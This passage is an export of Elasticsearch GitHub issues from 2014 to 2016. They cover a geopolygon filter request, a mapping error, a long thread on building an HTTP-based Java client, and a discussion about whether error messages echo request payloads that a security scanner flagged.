</description><key id="42900505">7751</key><summary>[Feature] Geopolygon filter - Even-odd &amp; Non-zero rules</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/nknize/following{/other_user}', u'events_url': u'https://api.github.com/users/nknize/events{/privacy}', u'organizations_url': u'https://api.github.com/users/nknize/orgs', u'url': u'https://api.github.com/users/nknize', u'gists_url': u'https://api.github.com/users/nknize/gists{/gist_id}', u'html_url': u'https://github.com/nknize', u'subscriptions_url': u'https://api.github.com/users/nknize/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/830187?v=4', u'repos_url': u'https://api.github.com/users/nknize/repos', u'received_events_url': u'https://api.github.com/users/nknize/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/nknize/starred{/owner}{/repo}', u'site_admin': False, u'login': u'nknize', u'type': u'User', u'id': 830187, u'followers_url': u'https://api.github.com/users/nknize/followers'}</assignee><reporter username="">altitude</reporter><labels><label>:Geo</label></labels><created>2014-09-16T16:10:04Z</created><updated>2015-11-21T18:50:35Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nknize" created="2014-12-08T18:50:16Z" id="66164876">Supporting this feature requires knowledge of edge direction.  Since GeoJSON doesn't enforce vertex order per OGC standards this can lead to ambiguous polygons (see issue #5968).  This is already being addressed by a number of new features (e.g., pr #8762, feature #8764, feature #8825).  

I really like this feature request, but we'll need to complete and merge these other features prior to making this enhancement in order to avoid logic fragmentation in geo core. 

Stay tuned. 
</comment><comment author="clintongormley" created="2015-11-21T18:50:35Z" id="158671848">@nknize just a ping about this given that geo2 has been merged
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations: More consistent response format for scripted metrics aggregation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7750</link><project id="" key="" /><description>Changes the name of the field in the scripted metrics aggregation from 'aggregation' to 'value' to be more in line with the other metrics aggregations like 'avg'
</description><key id="42899833">7750</key><summary>Aggregations: More consistent response format for scripted metrics aggregation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels /><created>2014-09-16T16:04:27Z</created><updated>2014-09-17T10:51:27Z</updated><resolved>2014-09-17T10:47:58Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-09-16T16:05:25Z" id="55767053">Looks fine.  Just to make sure, are there any doc examples that need to be changed?
</comment><comment author="rjernst" created="2014-09-16T17:53:14Z" id="55784312">LGTM.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update getting-started.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7749</link><project id="" key="" /><description>zip and tar is archive, deb and rpm is package.
</description><key id="42899785">7749</key><summary>Update getting-started.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">corochoone</reporter><labels /><created>2014-09-16T16:04:05Z</created><updated>2014-09-25T11:50:06Z</updated><resolved>2014-09-25T11:50:06Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Update upgrade.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7748</link><project id="" key="" /><description>Fix markup bug and change "deb" to "dpkg". (Package manager called dpkg, not deb in Debian distribution)
</description><key id="42899167">7748</key><summary>Update upgrade.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">corochoone</reporter><labels /><created>2014-09-16T15:58:50Z</created><updated>2014-09-24T19:10:18Z</updated><resolved>2014-09-24T19:10:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>UnicastZenPing don't rename configure host name</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7747</link><project id="" key="" /><description>#7719 introduced temporary node ids for nodes that can't be resolved via their address. The change is overly aggressive and creates temporary nodes also for the configure target hosts.
</description><key id="42899079">7747</key><summary>UnicastZenPing don't rename configure host name</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-16T15:58:08Z</created><updated>2015-06-07T12:02:08Z</updated><resolved>2014-09-16T16:06:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-16T16:01:35Z" id="55766461">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Docs: Document the most important changes to zen discovery.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7746</link><project id="" key="" /><description /><key id="42897567">7746</key><summary>Docs: Document the most important changes to zen discovery.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/bleskes/following{/other_user}', u'events_url': u'https://api.github.com/users/bleskes/events{/privacy}', u'organizations_url': u'https://api.github.com/users/bleskes/orgs', u'url': u'https://api.github.com/users/bleskes', u'gists_url': u'https://api.github.com/users/bleskes/gists{/gist_id}', u'html_url': u'https://github.com/bleskes', u'subscriptions_url': u'https://api.github.com/users/bleskes/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/1006375?v=4', u'repos_url': u'https://api.github.com/users/bleskes/repos', u'received_events_url': u'https://api.github.com/users/bleskes/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/bleskes/starred{/owner}{/repo}', u'site_admin': False, u'login': u'bleskes', u'type': u'User', u'id': 1006375, u'followers_url': u'https://api.github.com/users/bleskes/followers'}</assignee><reporter username="">martijnvg</reporter><labels><label>docs</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-16T15:45:27Z</created><updated>2015-05-18T23:30:00Z</updated><resolved>2014-09-30T11:11:36Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-24T14:49:30Z" id="56681287">LGTM in general, left some minor comments. Would love @clintongormley or @polyfractal to have a look as well.
</comment><comment author="martijnvg" created="2014-09-25T09:08:03Z" id="56792613">Updated the PR and applied @bleskes's feedback.
</comment><comment author="polyfractal" created="2014-09-25T13:39:51Z" id="56819471">Left a few comments.  LGTM overall!  :)
</comment><comment author="martijnvg" created="2014-09-26T12:03:31Z" id="56952567">Updated the PR and applied @polyfractal's feedback.
</comment><comment author="polyfractal" created="2014-09-29T20:42:56Z" id="57226325">:+1: LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>1.3.2 - MapperParsingException on a previously valid mapping</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7745</link><project id="" key="" /><description>Json is valid, mapping was valid in 1.2.1, now i can't create it in 1.3.2

_REQUEST:_

``` json
curl -XPOST 'http://.../collection' -d '
{
    "settings": {
        "number_of_shards": 5,
        "number_of_replicas": 1,
        "index": {
            "analysis": {
                "analyzer": {
                    "custom_analyzer_en": {
                        "type": "custom",
                        "tokenizer": "standard",
                        "char_filter": ["html_striper"],
                        "filter": [
                            "standard",
                            "lowercase",
                            "stop",
                            "asciifolding",
                            "elision",
                            "snowball"
                        ]
                    },
                    "custom_analyzer_fr": {
                        "type": "custom",
                        "tokenizer": "standard",
                        "char_filter": ["html_striper"],
                        "filter": [
                            "standard",
                            "lowercase",
                            "french_stop",
                            "french_stemmer",
                            "asciifolding",
                            "french_elision",
                            "french_snowball"
                        ]
                    },
                    "custom_analyzer_combo": {
                        "type": "combo",
                        "sub_analyzers": ["custom_analyzer_fr", "custom_analyzer_en"]
                    }
                },
                "filter": {
                    "snowball": {
                        "type": "snowball",
                        "language": "English"
                    },
                    "french_snowball": {
                        "type": "snowball",
                        "language": "French"
                    },
                    "french_elision": {
                        "type": "elision",
                        "articles": ["l", "m", "t", "qu", "n", "s", "j", "d", "c", "jusqu", "quoiqu", "lorsqu", "puisqu"]
                    },
                    "french_stop": {
                        "type": "stop",
                        "stopwords": [
                            "_french_"
                        ]
                    },
                    "french_stemmer": {
                        "type": "stemmer",
                        "language": "french"
                    }
                },
                "char_filter": {
                    "html_striper": {
                        "type": "html_strip"
                    }
                }
            }
        }
    },
    "mappings": {
        "oeuvre": {
            "dynamic": "strict",
            "workId": {
                "type": "long"
            },
            "sgoId": {
                "type": "long"
            },
            "status": {
                "type": "string",
                "index": "not_analyzed"
            },
            "primaryCompositionId": {
                "type": "long"
            },
            "primaryCompositionType": {
                "type": "string",
                "index": "not_analyzed"
            },
            "compositions": {
                "properties": {
                    "id": {
                        "type": "long"
                    },
                    "title_fr": {
                        "type": "multi_field",
                        "fields": {
                            "raw": {
                                "type": "string",
                                "index": "not_analyzed"
                            },
                            "title": {
                                "type": "string",
                                "analyzer": "custom_analyzer_fr"
                            },
                            "title_bilingual": {
                                "type": "string",
                                "analyzer": "custom_analyzer_combo"
                            }
                        }
                    },
                    "title_en": {
                        "type": "multi_field",
                        "fields": {
                            "raw": {
                                "type": "string",
                                "index": "not_analyzed"
                            },
                            "title": {
                                "type": "string",
                                "analyzer": "custom_analyzer_fr"
                            },
                            "title_bilingual": {
                                "type": "string",
                                "analyzer": "custom_analyzer_combo"
                            }
                        }
                    },
                    "length": {
                        "type": "date",
                        "format": "hour_minute_second_millis"
                    },
                    "compositionType": {
                        "type": "multi_field",
                        "fields": {
                            "raw": {
                                "type": "string",
                                "index": "not_analyzed"
                            },
                            "text": {
                                "type": "string",
                                "analyzer": "custom_analyzer_combo"
                            }
                        }
                    },
                    "primaryLanguage": {
                        "type": "string",
                        "index": "not_analyzed"
                    }
                }
            }
        }
    }
}'
```

_RESPONSE:_

``` json
{
    "error": "MapperParsingException[mapping [oeuvre]]; nested: MapperParsingException[Root type mapping not empty after parsing! Remaining fields:   [status : {index=not_analyzed, type=string}] [workId : {type=long}] [sgoId : {type=long}] [primaryCompositionId : {type=long}] [primaryCompositionType : {index=not_analyzed, type=string}] [compositions : {properties={id={type=long}, title_en={type=multi_field, fields={raw={index=not_analyzed, type=string}, title={analyzer=custom_analyzer_fr, type=string}, title_bilingual={analyzer=custom_analyzer_combo, type=string}}}, title_fr={type=multi_field, fields={raw={index=not_analyzed, type=string}, title={analyzer=custom_analyzer_fr, type=string}, title_bilingual={analyzer=custom_analyzer_combo, type=string}}}, length={format=hour_minute_second_millis, type=date}, compositionType={type=multi_field, fields={raw={index=not_analyzed, type=string}, text={analyzer=custom_analyzer_combo, type=string}}}, primaryLanguage={index=not_analyzed, type=string}}}]]; ",
    "status": 400
}
```
</description><key id="42891365">7745</key><summary>1.3.2 - MapperParsingException on a previously valid mapping</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">moskiteau</reporter><labels /><created>2014-09-16T14:55:04Z</created><updated>2014-09-16T15:09:53Z</updated><resolved>2014-09-16T15:09:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="moskiteau" created="2014-09-16T15:09:53Z" id="55757803">Actually, it was a stupid mistake of mine, mapping was missing properties for the root object...
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Mapping check during phase2 should be done in cluster state update task</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7744</link><project id="" key="" /><description>Before phase2 of the recovery process, we check verify that the local mapping is in sync with the cluster state mapping (and send &amp; wait on a master update mapping task if not). This check should be done under a cluster state update task to make sure an incoming cluster state update to do not change things while we check.
</description><key id="42888521">7744</key><summary>Mapping check during phase2 should be done in cluster state update task</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Recovery</label><label>bug</label><label>v1.3.5</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-16T14:31:40Z</created><updated>2015-06-07T18:44:19Z</updated><resolved>2014-09-22T09:10:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-18T14:08:58Z" id="56043154">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>"Native" HTTP Client</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7743</link><project id="" key="" /><description>My company (Bazaarvoice) is making heavy use of elasticsearch in our applications, and we've had a lot of trouble with the Java client options.

In short: both the Node and Transport clients suffer from sensitivity to differences in serialization. It's easy enough to maintain Java and ES version consistency within the cluster, but it's not so easy to do so between the cluster and client applications. Especially if you want to support operations like HA rolls. Using a JSON/REST client is much more permissive of variation between the client and server configurations.

On the other hand, the Java JSON client offerings have some pretty serious shortcomings of their own, mostly around having weird interfaces, but bugs are also a substantial challenge. 

Ideally, we would write all our code against the ES Client interface and then simply wire in an HttpTransportClient (e.g.). This would give the flexibility to experiment with the tradeoffs when using a Node client vs. a Transport client vs. Http. From a usablility perspective also, it seems preferable to reuse the same interfaces that ES already provides, documents, and maintains.

I've looked into the code, and it doesn't look like it would be too hairy, but I'd be surprised if you all hadn't thought about this problem at least once before.

I'd like to hear your thoughts before I get too deep into an implementation.
Also, I'd like to know if you'd have any interest in maintaining the library; specifically if you'd want it in the ES codebase or not. I can develop this in a separate repo, but if you think you'd ultimately want it, I should fork ES and send you a PR.

Thanks,
-John
</description><key id="42885669">7743</key><summary>"Native" HTTP Client</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">vvcephei</reporter><labels><label>:REST</label><label>enhancement</label><label>high hanging fruit</label><label>v5.0.0-alpha4</label></labels><created>2014-09-16T14:07:10Z</created><updated>2016-06-27T12:23:50Z</updated><resolved>2016-06-22T07:59:37Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="adrian-mcmichael" created="2014-10-02T10:32:55Z" id="57610418">This is also a problem that we are currently experiencing in developing with Elasticsearch at our company. We are in the process of moving from a monolithic app based set of applications to a micro-services based architecture. The way that the Java versions tie the client applications to Elasticsearch means that if we want to use Java 8 in one application that talks to Elasticsearch we have to update them all at once which isn't an easy task and goes against the idea of decoupling that micro-services provide us.

We've looked a little at Jest (https://github.com/searchbox-io/Jest) but it seems to be far behind the curve in terms of the functionality it provides (for example aggregations). We're also nervous about tying ourselves to a 3rd party project that is always going to be behind the curve compared the libraries Elasticsearch maintain.

We've also started looking at implementing the Elasticsearch Client.java interface to provide a pure HTTP RESTful based solution ourselves but it would be nice to know if this is already being worked on somewhere before we go too far down this path.
</comment><comment author="vvcephei" created="2014-10-02T12:39:12Z" id="57623409">Hey Adrian,

I didn't hear back on the original question, so I have to assume this thing will live on its own. I've started development in a private repo, and I'm pretty happy with the way it's going.

One thought I had was to stop short of implementing the entire API at first and just do index, get, and search, which is all most of our teams do with the client. That way, we can start exercising the client, and finish up the rest of the API calls later.

If the client is useful to you in this state, I can make it available once it is functional. Which API calls do you need?

Thanks,
-John
</comment><comment author="clintongormley" created="2014-11-07T11:42:51Z" id="62131642">Hi @vvcephei  and @adrian-mcmichael 

You can currently use any 1.x client with any 1.y server version (where y &gt;= x). I'm not a Java programmer, but If you switch to using HTTP, surely you'd be losing the ability to receive the response as proper Elasticsearch Java objects (without building a whole infrastructure that knows how to convert the JSON response)?

This is the part that makes me step back from a pure REST Java client.  Perhaps there is another way to improve the situation (or perhaps I've misunderstood).  What exactly are the pain points that you're trying to solve with this?
</comment><comment author="martijnvg" created="2014-11-28T10:40:50Z" id="64880180">The first step towards a native http client would be to add `FromXContext` interface and let the response classes implements this (SearchResponse, SearchHits, InternalAggregations etc..). Should be similar to the `ToXContext` interface, but then reading xcontext instead of writing.

This on its own would also be useful for #8150.
</comment><comment author="kimchy" created="2014-11-28T11:03:43Z" id="64882374">Either using "FromXContent" or the native serialization, a versioning aspect will need to be implemented. We already have versioning in the native serialization. The main benefit of using the Java client today is the strong typing it provides, cause by builders and deserialization support into Java objects. I think that adding the complexity of versioning with "xcontent" parsing will end up in the same problem space as versioning in the current native serialization, just more complicated (more code, ...).

There is another potential reason, and thats using HTTP as the transport layer, but still use the native serialization format. That can be beneficial, but is much simpler to implement.

I'd love to understand where the problems are when it comes to cross version (transport) client + server, and focus on resolving those.
</comment><comment author="vvcephei" created="2014-12-01T22:05:47Z" id="65143336">Thanks, guys, for the response. To clarify, the goal is to get a well designed and supported Java JSON client, not to use HTTP as the transport per se. 

Tl;dr:
I doubt there's any way to do the "right thing" with native serialization. The right way to go is "fromXContent". This is nonzero cost to implement and maintain, but it will save your java users from a lot of grief in the long run. 

Long-form thoughts:
There may be some benefits to using java serialization with HTTP instead of TCP, but it wouldn't address the main issue I'm confronting.

The "FromXContent" approach is what I had in mind. Native serialization is convenient to use, but it's just too sensitive to differences between the client's and cluster's JVMs. Particularly, I'm thinking of an issue in which the serialization of `Date` changed between java builds (I don't remember which right now; it might have been 1.7.0_25 and _45). This resulted in some very tricky errors for us to debug. It was all the more infuriating in that case because the errors also failed to deserialize, so we couldn't even see what was wrong.

Native serialization may work in most situations, but I don't think there is any way to ensure your clients won't face this kind of issue except to require them to use exactly the same version of java in the client application and the ES cluster. But this is a pretty tall order, since you'll have developer machines, application servers, and elasticsearch hosts, potentially all maintained by different teams; maybe even different companies.

Aside: I don't think there's a good reason to change how ES chatters internally because it's easy to guarantee every node in the cluster is using the same JVM version. Internally, efficient and compact serialization should be the priority.

I agree with Shay that we're looking at strictly more code and more maintenance, but the advantage is that you can explicitly control the situations under which a client is or is not api compatible with the server. I personally favor more permissive deserialization, so there wouldn't be a deserialization error unless it's not possible to construct a sane object from the json response, but I can see why you may want to be stricter with version checking. Either way, the typing is just as strong. It's just a question of the semantics as to whether certain fields are permitted to be absent on response objects.

I have already started implementing the "fromXContent" method for some parts of the API. I'm structuring it right now as a standalone library, but I'm happy to put it right inside the response objects instead and send a PR. This would make the implementation a little easier because there are a few cases where I need access to protected members to perform the deserialization, so I've had to play distasteful games with the packages.

I should mention that I've been preoccupied with my main project at work for the last couple of months, so the implementation situation is not much changed from my last exchange with Adrian.
</comment><comment author="jtjeferreira" created="2015-01-24T20:29:58Z" id="71335853">hi @vvcephei 

you have any progress on your work? I also feel that the REST API support for the JVM story is not good. Currently we are using Jest and we also miss the aggregations support.

We are using ES via HTTP mainly due to authentication requirements.
</comment><comment author="vvcephei" created="2015-03-06T04:33:46Z" id="77505293">Hey @jtjferreira

I had to put the project aside for longer than I wanted to focus on some
other major es projects at work, but I'm getting back into it for now. I'm
updating the dependency to ES 1.4.4, and I'm going to start with just get()
and index() to get a round-trip going. Once that is in place, I'll
publicize my repo and post a link to it here so everyone can get a more
concrete look at what I'm thinking.

I've already implemented these two functions on 0.90.7, so it shouldn't be
too long before I get to this phase. I got fairly bogged down before
working my way through search() because the facet response has so many
different forms. Hence, my desire to get _something_ out there.

Thanks for the interest. I won't leave you hanging too much longer.

-John

On Sat, Jan 24, 2015 at 2:30 PM, jtjeferreira notifications@github.com
wrote:

&gt; hi @vvcephei https://github.com/vvcephei
&gt; 
&gt; you have any progress on your work? I also feel that the REST API support
&gt; for the JVM story is not good. Currently we are using Jest and we also miss
&gt; the aggregations support.
&gt; 
&gt; We are using ES via HTTP mainly due to authentication requirements.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/elasticsearch/elasticsearch/issues/7743#issuecomment-71335853
&gt; .
</comment><comment author="vvcephei" created="2015-03-20T22:05:32Z" id="84166382">Ok, folks, I've sketched out what I've been talking about here: https://github.com/vvcephei/es-rest-client-java

Please let me know what you think. For the long-term plans, see the README. For stuff that's on the roadmap, see the issues.

At this point, these are my top-level questions:
- What are the conditions under which ES adopt this project (once it's done) to be officially supported along with the other clients?
- Would ES at consider PRs to pull the fromXContent methods from this project to live next to the toXContent methods of the domain model objects? (thanks @kimchy  for that suggestion)
- Would ES consider PRs to serialize more information in the API (to allow us to reconstruct the Internal\* domain objects from the json response)? I can see arguments on both sides of this, so I'd like to see what you think before I start sending PRs.

Thanks, everyone,
-John
</comment><comment author="matt-blanchette" created="2015-11-11T21:49:15Z" id="155920340">+1 for same Client API but with HTTP transport
The Amazon ElasticSearch Service currently only supports HTTP
</comment><comment author="davsclaus" created="2016-02-19T17:46:45Z" id="186326370">+1
</comment><comment author="vvcephei" created="2016-02-22T00:30:54Z" id="186951460">Hey @matt-blanchette and @davsclaus,

It's good to hear I'm not the only one who thinks this should happen. You might want to check out the repo I previously linked (https://github.com/vvcephei/es-rest-client-java). Right now, it is only built against 1.3 and 1.4, but updating it is usually pretty straightforward. 

One of my coworkers did some pretty extensive functional testing of it and resolved a number of bugs. We didn't get a chance to to perf testing before we both got preoccupied with other concerns, though.

I haven't put much work into this project recently because:
- for us, the transport client is relatively safe now that they no longer use Java serialization.
- afiak, there's no concrete interest in having this library completed.

If you (or anyone else) want to use it, please let me know, and I'll make it a priority to support you.

Thanks,
-John
</comment><comment author="s1monw" created="2016-02-22T00:32:53Z" id="186951568">FYI - we announced that we will build an official http client with minimal dependencies. I will assign this issue to me and will update it with the plans once we have them ready for you. I am pretty sure we will provide a basic version in the next couple of months but for now I just wanted to let everybody know we have it on the roadmap.
</comment><comment author="vvcephei" created="2016-02-22T00:35:45Z" id="186952154">Oh, hey @s1monw! I missed that announcement. It's great to hear.

I don't know if it will help you, but feel free to mine my project if it helps you get started.

I'm also more than happy to volunteer if you want help on the official client.

Thanks,
-John
</comment><comment author="otisg" created="2016-04-05T20:22:10Z" id="205975666">@s1monw this is still slated for 5.0.0?
</comment><comment author="javanna" created="2016-04-06T17:14:07Z" id="206469915">&gt; this is still slated for 5.0.0?

@otisg yes that is the goal.
</comment><comment author="RichardWalshTZ" created="2016-05-13T08:47:22Z" id="218986175">Is there a JIRA issue number we can follow for this?

When you say basic API what do you mean, is there anywhere I can see a spec on what to expect.

Reason I ask is that I have hit the same limitations with the existing APIs that the other guys have experienced.

I am also now going to re-look at Spring Data ElasticSearch given that they have upgraded recently just to see what they have done. 
</comment><comment author="javanna" created="2016-05-13T10:42:57Z" id="219010217">&gt; Is there a JIRA issue number we can follow for this?

We don't use JIRA but this is the right github issue for it. When there will be a pull request it will reference this issue.

&gt; When you say basic API what do you mean, is there anywhere I can see a spec on what to expect.

Our REST spec are shared between all of our language clients and are here: https://github.com/elastic/elasticsearch/tree/master/rest-api-spec . The first version of the java client will be quite low level, with a very simple `performRequest` method that allows to send http requests to the cluster doing round-robin against multiple nodes and handling fail-over. We will then have api specific objects so that users can do things like `indexClient.index(index, type, id, body)` etc.

&gt; Reason I ask is that I have hit the same limitations with the existing APIs that the other guys have experienced.

I think the biggest limitation is the fact that you have to depend on the whole elasticsearch to connect to it through java, plus bw compatibility on the transport layer, and those are the main reasons why we are working on the java REST client.
</comment><comment author="gquintana" created="2016-05-17T09:33:00Z" id="219666992">It would be fantastic if this client could implement the current `Client` interface (like @vvcephei implementation) and be a drop in replacement for the `TransportClient` or `NodeClient`.
</comment><comment author="javanna" created="2016-05-17T09:43:06Z" id="219669275">Hi @gquintana , I agree it would be nice, but I don't think it is likely to happen. I don't expect migrating to be particularly hard, but changes will be required. Also keep in mind that the very first version may be much more low level than the `Client` interface, which has calls for each specific api etc.
</comment><comment author="robinst" created="2016-06-24T01:45:34Z" id="228235478">&gt; We will then have api specific objects so that users can do things like indexClient.index(index, type, id, body) etc.

Is there another issue to follow the progress on this part?
</comment><comment author="javanna" created="2016-06-24T07:35:19Z" id="228277383">Hi @robinst I created a meta issue for the planned improvements, which will be updated as we go: #19055 .
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[Security] Prevent returning (malicious) request payload in error messages</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7742</link><project id="" key="" /><description>I realize that my use-case is somewhat artificial. It stems from our app talking to ES server via REST having to be scanned with a mandatory security tool (WebInspect). And it does not like when input parameters/body then appears in outputs of the request It tries to inject &lt;script&gt;alert()&lt;/script&gt; etc to test for script, DOM, SQL etc injections. It also complains when seeing any parts of stack trace or exception names in the output. 

So as artificial as it seems I still want to bring it to your attention. Maybe it would make sense to have ES config option(s) to control REST error return verbosity - i.e. whether to include exception text, stack trace, original request etc

With javascript consumers of ES REST API it is conceivable that JSON response would be evaluated with malicious side effects. For example _search endpoint returns original query as part of its error message. If the query has intentionally an executable javascript it is conceivable it may be executed during JSON parsing (older browsers or JS engines). I wonder if it would make sense to have config option for ES to return generic errors in production (should not affect logging). Apart from not including the potentially malicious original query, I would also like to configure ES not to return any detailed exception  info - just a generic error message .
</description><key id="42884792">7742</key><summary>[Security] Prevent returning (malicious) request payload in error messages</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">roytmana</reporter><labels><label>discuss</label><label>feedback_needed</label></labels><created>2014-09-16T13:58:43Z</created><updated>2014-11-07T11:29:08Z</updated><resolved>2014-11-07T11:29:08Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-24T19:02:06Z" id="56721292">Hi @roytmana 

Responses should be returned as content type JSON, which browsers should not render as HTML or try to execute.  Can you give any examples where this might not be the case?
</comment><comment author="roytmana" created="2014-09-25T23:37:02Z" id="56901130">I agree with you - i am just looking for a way out of these webinspect scan false positives it does not care that content type is json - all it knows is that it was able to injected something (sent it in request and got back in response)
.
If a framework has a generic error handling it may attempt to show error description whn it sees http error code and not properly escape it. But overall it is a very artificial case

Never the lessbit maybe a nice api enhancement to control verbosity and details of error messages
</comment><comment author="clintongormley" created="2014-11-07T11:29:08Z" id="62130342">Thanks @roytmana. We've discussed this at length and agree with you that this is an artificial use case - really it is up to the consuming application to do the right thing and not try to execute exceptions.  

Rather than applying blunts settings to all exceptions, we are trying to make exceptions better, eg see #7891
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Issue 6410 bulk indexing missing index update</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7741</link><project id="" key="" /><description>```
Bulk API: Do not fail whole request on closed index

Changes from comments to @spinscale PR.
"""
The bulk API request was marked as completely failed,
in case a request with a closed index was referred in
any of the requests inside of a bulk one.

Implementation Note: Currently the implementation is a bit more verbose in order to prevent an instanceof check and another cast - if that is fast enough, we could execute that logic only once at the 
"""
See #6790
```
</description><key id="42884779">7741</key><summary>Issue 6410 bulk indexing missing index update</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">GaelTadh</reporter><labels /><created>2014-09-16T13:58:34Z</created><updated>2014-09-19T09:17:02Z</updated><resolved>2014-09-19T09:17:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-16T14:11:44Z" id="55748224">left some minor commetns - thanks for the PR
</comment><comment author="s1monw" created="2014-09-18T14:16:54Z" id="56044300">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: Make `TransportMasterNodeOperationAction#checkBlock` abstract</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7740</link><project id="" key="" /><description>`TransportMasterNodeOperationAction#checkBlock` should be implemented by any subclasses of ``TransportMasterNodeOperationAction` but it's returning `null` by default. We should make that abstract to force implementations for it.
